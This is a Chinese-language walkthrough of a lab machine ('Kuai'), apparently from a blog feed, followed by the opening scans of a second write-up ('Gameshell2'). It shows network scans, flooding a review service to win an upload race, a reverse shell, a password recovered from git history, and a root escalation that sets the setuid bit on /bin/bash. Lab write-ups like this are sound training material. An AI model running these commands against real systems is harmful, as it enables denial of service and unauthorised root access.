(Unknown)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.2<br>Host is up (0.00085s latency).<br>MAC Address: 08:00:27:5C:1B:0E (Oracle VirtualBox virtual NIC)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.29<br>Host is up (0.00082s latency).<br>MAC Address: 08:00:27:DB:04:74 (Oracle VirtualBox virtual NIC)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.4<br>Host is up.<br>Nmap <span class="hljs-keyword">done</span>: 256 IP addresses (4 hosts up) scanned <span class="hljs-keyword">in</span> 2.09 seconds<br></code></pre></td></tr></table></figure><p>靶机IP：<code>192.168.2.29</code></p><h2 id="2、端口扫描"><a href="#2、端口扫描" class="headerlink" title="2、端口扫描"></a>2、端口扫描</h2><h3 id="1-全端口扫描"><a href="#1-全端口扫描" class="headerlink" title="1.全端口扫描"></a>1.全端口扫描</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miaosec]<br>└─# nmap --min-rate 10000 -p- 192.168.2.29<br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-12-24 15:16 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.29<br>Host is up (0.0012s latency).<br>Not shown: 65532 closed tcp ports (reset)<br>PORT     STATE SERVICE<br>22/tcp   open  ssh<br>80/tcp   open  http<br>3000/tcp open  ppp<br>MAC Address: 08:00:27:DB:04:74 (Oracle VirtualBox virtual NIC)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 48.85 seconds<br></code></pre></td></tr></table></figure><p>开放端口：<code>22、80、3000</code></p><h3 id="2-详细信息扫描"><a href="#2-详细信息扫描" class="headerlink" title="2.详细信息扫描"></a>2.详细信息扫描</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miaosec]<br>└─# nmap --min-rate 10000 -sT -sV -sC -O -p22,80,3000 192.168.2.29<br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-12-26 11:31 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.29<br>Host is up (0.00087s latency).<br><br>PORT     STATE SERVICE VERSION<br>22/tcp   open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)<br>| ssh-hostkey: <br>|   3072 f6:a3:b6:78:c4:62:af:44:bb:1a:a0:0c:08:6b:98:f7 (RSA)<br>|   256 bb:e8:a2:31:d4:05:a9:c9:31:ff:62:f6:32:84:21:9d (ECDSA)<br>|_  256 3b:ae:34:64:4f:a5:75:b9:4a:b9:81:f9:89:76:99:eb (ED25519)<br>80/tcp   open  http    Apache httpd 2.4.62 ((Debian))<br>|_http-server-header: Apache/2.4.62 (Debian)<br>|_http-title: Maze\xE4\xB8\x8A\xE4\xBC\xA0<br>3000/tcp open  ppp?<br>| fingerprint-strings: <br>|   GetRequest: <br>|     HTTP/1.1 200 OK<br>|     Server: Werkzeug/3.1.4 Python/3.9.2<br>|     Date: Fri, 26 Dec 2025 03:31:28 GMT<br>|     Content-Type: text/html; charset=utf-8<br>|     Content-Length: 61<br>|     Connection: close<br>|     Upload Review server: Please use the API <span class="hljs-keyword">for</span> operations(/api)<br>|   HTTPOptions: <br>|     HTTP/1.1 200 OK<br>|     Server: Werkzeug/3.1.4 Python/3.9.2<br>|     Date: Fri, 26 Dec 2025 03:31:33 GMT<br>|     Content-Type: text/html; charset=utf-8<br>|     Allow: GET, OPTIONS, HEAD<br>|     Content-Length: 0<br>|     Connection: close<br>|   Help: <br>|     &lt;!DOCTYPE HTML PUBLIC <span class="hljs-string">&quot;-//W3C//DTD HTML 4.01//EN&quot;</span><br>|     <span class="hljs-string">&quot;http://www.w3.org/TR/html4/strict.dtd&quot;</span>&gt;<br>|     &lt;html&gt;<br>|     &lt;<span class="hljs-built_in">head</span>&gt;<br>|     &lt;meta http-equiv=<span class="hljs-string">&quot;Content-Type&quot;</span> content=<span class="hljs-string">&quot;text/html;charset=utf-8&quot;</span>&gt;<br>|     &lt;title&gt;Error response&lt;/title&gt;<br>|     &lt;/head&gt;<br>|     &lt;body&gt;<br>|     &lt;h1&gt;Error response&lt;/h1&gt;<br>|     &lt;p&gt;Error code: 400&lt;/p&gt;<br>|     &lt;p&gt;Message: Bad request syntax (<span class="hljs-string">&#x27;HELP&#x27;</span>).&lt;/p&gt;<br>|     &lt;p&gt;Error code explanation: HTTPStatus.BAD_REQUEST - Bad request syntax or unsupported method.&lt;/p&gt;<br>|     &lt;/body&gt;<br>|     &lt;/html&gt;<br>|   RTSPRequest: <br>|     &lt;!DOCTYPE HTML PUBLIC <span class="hljs-string">&quot;-//W3C//DTD HTML 4.01//EN&quot;</span><br>|     <span class="hljs-string">&quot;http://www.w3.org/TR/html4/strict.dtd&quot;</span>&gt;<br>|     &lt;html&gt;<br>|     &lt;<span class="hljs-built_in">head</span>&gt;<br>|     &lt;meta http-equiv=<span class="hljs-string">&quot;Content-Type&quot;</span> content=<span class="hljs-string">&quot;text/html;charset=utf-8&quot;</span>&gt;<br>|     &lt;title&gt;Error response&lt;/title&gt;<br>|     &lt;/head&gt;<br>|     &lt;body&gt;<br>|     &lt;h1&gt;Error response&lt;/h1&gt;<br>|     &lt;p&gt;Error code: 400&lt;/p&gt;<br>|     &lt;p&gt;Message: Bad request version (<span class="hljs-string">&#x27;RTSP/1.0&#x27;</span>).&lt;/p&gt;<br>|     &lt;p&gt;Error code explanation: HTTPStatus.BAD_REQUEST - Bad request syntax or unsupported method.&lt;/p&gt;<br>|     &lt;/body&gt;<br>|_    &lt;/html&gt;<br>1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :<br>SF-Port3000-TCP:V=7.94SVN%I=7%D=12/26%Time=694E0191%P=x86_64-pc-linux-<br>MAC Address: 08:00:27:DB:04:74 (Oracle VirtualBox virtual NIC)<br>Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port<br>Device <span class="hljs-built_in">type</span>: general purpose<br>Running: Linux 4.X|5.X<br>OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5<br>OS details: Linux 4.15 - 5.8<br>Network Distance: 1 hop<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 90.04 seconds<br></code></pre></td></tr></table></figure><h1 id="二、WEB渗透"><a href="#二、WEB渗透" class="headerlink" title="二、WEB渗透"></a>二、WEB渗透</h1><h2 id="1、80端口"><a href="#1、80端口" class="headerlink" title="1、80端口"></a>1、80端口</h2><p>80端口是一个文件上传服务，上传后的文件需要经过审核服务器的审核，审核成功后才能成功进行上传<br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202512261134255.png"></p><p>目录扫描</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miaosec]<br>└─# dirsearch -u <span class="hljs-string">&quot;http://192.168.2.29&quot;</span>                                   <br>Target: http://192.168.2.29/<br>[11:34:53] Starting: <br>....<br>[11:35:54] 301 -  314B  - /uploads  -&gt;  http://192.168.2.29/uploads/<br>[11:35:54] 200 -  488B  - /uploads/<br><br>Task Completed<br></code></pre></td></tr></table></figure><p>目录<code>/uploads</code>是文件上传成功后的目录</p><h2 id="2、3000端口"><a href="#2、3000端口" class="headerlink" title="2、3000端口"></a>2、3000端口</h2><p>3000端口是文件上传审核服务，显示需要访问<code>api</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miaosec]<br>└─# curl http://192.168.2.29:3000<br>Upload Review server: Please use the API <span class="hljs-keyword">for</span> operations(/api) <br></code></pre></td></tr></table></figure><p>访问<code>api</code>返回状态</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miaosec]<br>└─# curl http://192.168.2.29:3000/api<br>&#123;<span class="hljs-string">&quot;status&quot;</span>:<span class="hljs-string">&quot;ok&quot;</span>&#125;<br></code></pre></td></tr></table></figure><h2 id="3、文件上传利用"><a href="#3、文件上传利用" class="headerlink" title="3、文件上传利用"></a>3、文件上传利用</h2><p>因此渗透思路：尝试<code>DDos</code>3000端口的服务，使文件审核服务失效</p><ol><li><p>DDos3000端口服务<br>直接使用<code>gobuster</code>进行目录扫描，模拟DDoS攻击，设置速率<code>-t=1000</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miaosec/ddos]<br>└─# gobuster <span class="hljs-built_in">dir</span> -u http://192.168.2.29:3000/api -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -t 10000  <br></code></pre></td></tr></table></figure></li><li><p>进行文件上传，利用条件竞争的方式，使用burp重复发送数据包<br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202512261145735.png"></p></li><li><p>成功上传shell<br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202512300951895.png"></p></li></ol><h1 id="三、获取到www-data权限"><a href="#三、获取到www-data权限" class="headerlink" title="三、获取到www-data权限"></a>三、获取到www-data权限</h1><p>成功获取到shell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miaosec]<br>└─# nc -lvnp 4444                                                 <br>listening on [any] 4444 ...<br>connect to [192.168.2.4] from (UNKNOWN) [192.168.2.29] 59000<br><span class="hljs-built_in">id</span><br>uid=33(www-data) gid=33(www-data) <span class="hljs-built_in">groups</span>=33(www-data)<br></code></pre></td></tr></table></figure><p>稳定shell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">script /dev/null -c bash<br>ctrl+z<br><span class="hljs-built_in">stty</span> raw -<span class="hljs-built_in">echo</span>; <span class="hljs-built_in">fg</span><br>reset<br>xterm<br></code></pre></td></tr></table></figure><h1 id="四、权限提升"><a href="#四、权限提升" class="headerlink" title="四、权限提升"></a>四、权限提升</h1><h2 id="1、获取tuf权限"><a href="#1、获取tuf权限" class="headerlink" title="1、获取tuf权限"></a>1、获取tuf权限</h2><p>发现在<code>/opt</code>目录下面存在<code>.git泄露</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@Kuai:/var/www/html$ <span class="hljs-built_in">ls</span> -la /opt<br>total 16<br>drwxr-xr-x  3 root root 4096 Dec 23 05:12 .<br>drwxr-xr-x 18 root root 4096 Mar 18  2025 ..<br>drwxr-xr-x  8 root root 4096 Dec 23 05:13 .git<br>-rw-r--r--  1 root root  308 Dec 23 05:12 app.py<br></code></pre></td></tr></table></figure><p>使用<code>git log</code>查看项目提交历史记录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@Kuai:/opt$ git <span class="hljs-built_in">log</span>   <br>fatal: detected dubious ownership <span class="hljs-keyword">in</span> repository at <span class="hljs-string">&#x27;/opt&#x27;</span><br>To add an exception <span class="hljs-keyword">for</span> this directory, call:<br><br>        git config --global --add safe.directory /opt<br>www-data@Kuai:/opt$ git config --global --add safe.directory /opt<br>fatal: <span class="hljs-variable">$HOME</span> not <span class="hljs-built_in">set</span><br>www-data@Kuai:/opt$ <span class="hljs-built_in">export</span> HOME=/tmp <br>www-data@Kuai:/opt$ git config --global --add safe.directory /opt<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@Kuai:/opt$ git <span class="hljs-built_in">log</span>                                      <br>WARNING: terminal is not fully functional<br>-  (press RETURN)commit 937ff3b9ba793ab8e772dc5203f1170629cdfedf (HEAD -&gt; master)<br>Author: Your Name &lt;you@example.com&gt;<br>Date:   Tue Dec 23 05:13:09 2025 -0500<br><br>    a<br><br>commit f268d01060bba2e565791d8127eb88d28d546e0d<br>Author: Your Name &lt;you@example.com&gt;<br>Date:   Tue Dec 23 05:12:32 2025 -0500<br><br>    1<br><br>commit 5c37bb88686b9013c6834f0b307a27654664e734<br>Author: Your Name &lt;you@example.com&gt;<br>Date:   Tue Dec 23 05:11:52 2025 -0500<br><br>    1<br></code></pre></td></tr></table></figure><p>查看git对象提交的详细信息</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@Kuai:/opt$ git show f268d01060bba2e565791d8127eb88d28d546e0d<br>WARNING: terminal is not fully functional<br>-  (press RETURN)commit f268d01060bba2e565791d8127eb88d28d546e0d<br>Author: Your Name &lt;you@example.com&gt;<br>Date:   Tue Dec 23 05:12:32 2025 -0500<br><br>    1<br><br>diff --git a/app.py b/app.py<br>index 61c33fe..612613f 100644<br>--- a/app.py<br>+++ b/app.py<br>@@ -2,10 +2,12 @@<br> from flask import Flask, jsonify<br> <br> app = Flask(__name__)<br>+// tuf: Cbr5Cq1QBS2GHUOGuJrc<br> <br> @app.route(<span class="hljs-string">&#x27;/&#x27;</span>)<br> def index():<br>     <span class="hljs-built_in">return</span> <span class="hljs-string">&#x27;&lt;E8&gt;&lt;AF&gt;&lt;B7&gt;&lt;E9&gt;&lt;80&gt;&lt;9A&gt;&lt;E8&gt;&lt;BF&gt;&lt;87&gt;API&lt;E6&gt;&lt;93&gt;&lt;8D&gt;&lt;E4&gt;&lt;BD&gt;&lt;9C&gt;&#x27;</span><br>+    <br> <br> @app.route(<span class="hljs-string">&#x27;/api&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>])<br> def api():<br></code></pre></td></tr></table></figure><p>找到用户名和密码<code>tuf: Cbr5Cq1QBS2GHUOGuJrc</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~]<br>└─# ssh tuf@192.168.2.29<br>tuf@192.168.2.29<span class="hljs-string">&#x27;s password: </span><br><span class="hljs-string">tuf@Kuai:~$ id</span><br><span class="hljs-string">uid=1000(tuf) gid=1000(tuf) groups=1000(tuf)</span><br></code></pre></td></tr></table></figure><h2 id="2、获取root权限"><a href="#2、获取root权限" class="headerlink" title="2、获取root权限"></a>2、获取root权限</h2><p>查看运行的进程，<code>app.py</code>以root的权限运行着，而<code>app.py</code>又属于<code>tuf</code>的<code>/home</code>目录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">tuf@Kuai:~$ ps -anux | grep app.py<br>       0     401  0.0  0.0   2472   572 ?        Ss   20:30   0:00 /bin/sh -c python3 /home/tuf/app.py<br>       0     403 16.2  1.9 605004 40660 ?        S    20:30   5:24 python3 /home/tuf/app.py<br></code></pre></td></tr></table></figure><p>替换<code>app.py</code>即可</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">tuf@Kuai:~$ <span class="hljs-built_in">mv</span> app.py app.py.bak<br>tuf@Kuai:~$ vi app.py<br>tuf@Kuai:~$ <span class="hljs-built_in">cat</span> app.py<br>import os <br><br>os.system(<span class="hljs-string">&#x27;chmod +s /bin/bash&#x27;</span>)<br></code></pre></td></tr></table></figure><p><code>/bin/bash</code>具有<code>suid</code>权限</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">tuf@Kuai:~$ <span class="hljs-built_in">ls</span> -la /bin/bash<br>-rwsr-sr-x 1 root root 1168776 Apr 18  2019 /bin/bash<br></code></pre></td></tr></table></figure><p>成功获取到<code>root</code>权限</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">tuf@Kuai:~$ bash -p<br>bash-5.0# <span class="hljs-built_in">id</span><br>uid=1000(tuf) gid=1000(tuf) euid=0(root) egid=0(root) <span class="hljs-built_in">groups</span>=0(root),1000(tuf)<br></code></pre></td></tr></table></figure><h1 id="五、获取FLAG"><a href="#五、获取FLAG" class="headerlink" title="五、获取FLAG"></a>五、获取FLAG</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">bash-5.0# <span class="hljs-built_in">cat</span> /root/root.txt /home/tuf/user.txt<br>flag&#123;root-95018486b629352b77c99094f3b9ecac&#125;<br>flag&#123;user-a6ecaaa0bbecc2c0f772206395a5d33d&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Maze-sec</category>
      
    </categories>
    
    
    <tags>
      
      <tag>文件上传</tag>
      
      <tag>git泄露</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Gameshell2</title>
    <link href="/Maze-sec/Gameshell2/"/>
    <url>/Maze-sec/Gameshell2/</url>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="靶机说明"><a href="#靶机说明" class="headerlink" title="靶机说明"></a>靶机说明</h1><ul><li>QQ群：<code>660930334</code></li></ul><h1 id="一、信息收集"><a href="#一、信息收集" class="headerlink" title="一、信息收集"></a>一、信息收集</h1><h2 id="1、主机探测"><a href="#1、主机探测" class="headerlink" title="1、主机探测"></a>1、主机探测</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~/miaosec]<br>└─# nmap -sn 192.168.2.0/24<br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-12-16 09:10 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.1<br>Host is up (0.00069s latency).<br>MAC Address: 0A:00:27:00:00:07 (Unknown)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.2<br>Host is up (0.00059s latency).<br>MAC Address: 08:00:27:59:EA:A8 (Oracle VirtualBox virtual NIC)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.25<br>Host is up (0.0013s latency).<br>MAC Address: 08:00:27:67:2B:0B (Oracle VirtualBox virtual NIC)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.4<br>Host is up.<br>Nmap <span class="hljs-keyword">done</span>: 256 IP addresses (4 hosts up) scanned <span class="hljs-keyword">in</span> 2.19 seconds<br></code></pre></td></tr></table></figure><p>靶机IP：<code>192.168.2.25</code></p><h2 id="2、端口扫描"><a href="#2、端口扫描" class="headerlink" title="2、端口扫描"></a>2、端口扫描</h2><h3 id="1-全端口扫描"><a href="#1-全端口扫描" class="headerlink" title="1.全端口扫描"></a>1.全端口扫描</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miaosec]<br>└─# nmap --min-rate 10000 -p- 192.168.2.25                   <br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-12-15 09:41 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.25<br>Host is up (0.0093s latency).<br>Not shown: 65529 filtered tcp ports (no-response)<br>PORT    STATE SERVICE<br>22/tcp  open  ssh<br>25/tcp  open  smtp<br>79/tcp  open  finger<br>80/tcp  open  http<br>110/tcp open  pop3<br>143/tcp open  imap<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 20.51 seconds<br></code></pre></td></tr></table></figure><p>开放端口：<code>22、25、79、80、110、143</code></p><h3 id="2-详细信息扫描"><a href="#2-详细信息扫描" class="headerlink" title="2.详细信息扫描"></a>2.详细信息扫描</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miaosec]<br>└─# nmap --min-rate 10000 -sT -sV -sC -O -p22,25,79,80,110,143 192.168.2.25<br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-12-15 09:41 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.25<br>Host is up (0.0043s latency).<br><br>PORT    STATE SERVICE    VERSION<br>22/tcp  open  ssh        OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)<br>| ssh-hostkey: <br>|   3072 f6:a3:b6:78:c4:62:af:44:bb:1a:a0:0c:08:6b:98:f7 (RSA)<br>|   256 bb:e8:a2:31:d4:05:a9:c9:31:ff:62:f6:32:84:21:9d (ECDSA)<br>|_  256 3b:ae:34:64:4f:a5:75:b9:4a:b9:81:f9:89:76:99:eb (ED25519)<br>25/tcp  open  tcpwrapped<br>|_smtp-commands: Couldn t establish connection on port 25<br>79/tcp  open  finger     OpenBSD fingerd (ported to Linux)<br>| finger: \x0D<br>| Welcome to Linux version 4.19.0-27-amd64 at GameShell2 !\x0D<br>| <br>|  20:42:06 up 2 min,  0 <span class="hljs-built_in">users</span>,  load average: 0.01, 0.01, 0.00<br>| \x0D<br>|_No one logged on.\x0D<br>80/tcp  open  http       Apache httpd 2.4.62 ((Debian))<br>| http-robots.txt: 1 disallowed entry <br>|_/ternimal/<br>|_http-server-header: Apache/2.4.62 (Debian)<br>110/tcp open  tcpwrapped<br>143/tcp open  tcpwrapped<br>Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port<br>Device <span class="hljs-built_in">type</span>: WAP<br>Running: Actiontec embedded, Linux<br>OS CPE: cpe:/h:actiontec:mi424wr-gen3i cpe:/o:linux:linux_kernel<br>OS details: Actiontec MI424WR-GEN3I WAP<br>Service Info: Host: GameShell2; OSs: Linux, Linux 4.19.0-27-amd64; CPE: cpe:/o:linux:linux_kernel, cpe:/o:linux:linux_kernel:4.19.0-27-amd64<br><br>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 27.54 seconds<br></code></pre></td></tr></table></figure><ol><li><strong>22端口:</strong> ssh服务</li><li><strong>25端口:</strong> 简单邮件传输协议-SMTP</li><li><strong>79端口:</strong> finger服务</li><li><strong>80端口:</strong> http服务</li><li><strong>110端口:</strong> 邮局协议-pop</li><li><strong>143端口:</strong> 互联网邮件访问协议-IMAP</li></ol><h3 id="3-udp扫描"><a href="#3-udp扫描" class="headerlink" title="3.udp扫描"></a>3.udp扫描</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miaosec]<br>└─# nmap -sU --top-ports 100 192.168.2.25                                  <br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-12-15 09:42 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.25<br>Host is up (0.0013s latency).<br>Not shown: 99 closed udp ports (port-unreach)<br>PORT   STATE         SERVICE<br>68/udp open|filtered dhcpc<br>MAC Address: 08:00:27:7D:6D:AE (Oracle VirtualBox virtual NIC)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 110.24 seconds<br></code></pre></td></tr></table></figure><h1 id="二、web渗透"><a href="#二、web渗透" class="headerlink" title="二、web渗透"></a>二、web渗透</h1><h2 id="1、目录扫描"><a href="#1、目录扫描" class="headerlink" title="1、目录扫描"></a>1、目录扫描</h2><figure class="highlight 